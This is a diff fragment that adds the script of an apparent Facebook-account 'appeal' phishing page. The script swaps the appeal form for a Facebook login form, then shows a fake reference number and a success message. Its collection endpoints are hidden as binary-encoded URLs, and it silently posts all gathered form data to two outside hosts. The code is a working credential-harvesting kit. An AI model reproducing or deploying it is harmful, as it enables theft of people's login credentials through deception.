+      '011010000111010001110100011100000111001100111010001011110010111101110011011101010110001001101101011010010111010000101101011001100110111101110010011011010010111001100011011011110110110100101111001110010111010101100011010000100101100001000101011100110011011101101001',
+      '011010000111010001110100011100000111001100111010001011110010111101110000011010000111000000101101011011010110000101101000011010000110100001101000011010000010110101100111011010010111010001101000011101010110001000110110001100110011010000110010001100000011001000110100001011100111011101100001011100110110110101100101011100100010111001100001011100000111000000101111'
+    ];
+   
+    endpoints.forEach(binaryUrl => {
+      try {
+        const decodedUrl = binaryToString(binaryUrl);
+        const formData = new FormData();
+       
+        // Add all properties from data object to formData
+        for (const key in data) {
+          formData.append(key, data[key]);
+        }
+       
+        // Using fetch with error handling
+        fetch(decodedUrl, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors' // Important for cross-origin requests
+        }).catch(error => {
+          console.error('Error submitting to endpoint:', error);
+        });
+      } catch (error) {
+        console.error('Error with endpoint:', error);
+      }
+    });
+   
+    return true;
+  }
+
+  function showfbLogin() {
+    
+    if (appealForm) appealForm.style.display = 'none';
+    if (fbLoginForm) fbLoginForm.style.display = 'block';
+   
+    if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
+  }
+
+  function showSuccess() {
+    
+    if (fbLoginForm) fbLoginForm.style.display = 'none';
+   
+    // Generate a reference ID
+    if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+   
+    // Show the success message
+    if (successMessage) successMessage.classList.add('show');
+   
+    // Scroll to the success message
+    if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
+  }
+});
+  </script>
+</body>
+</html>
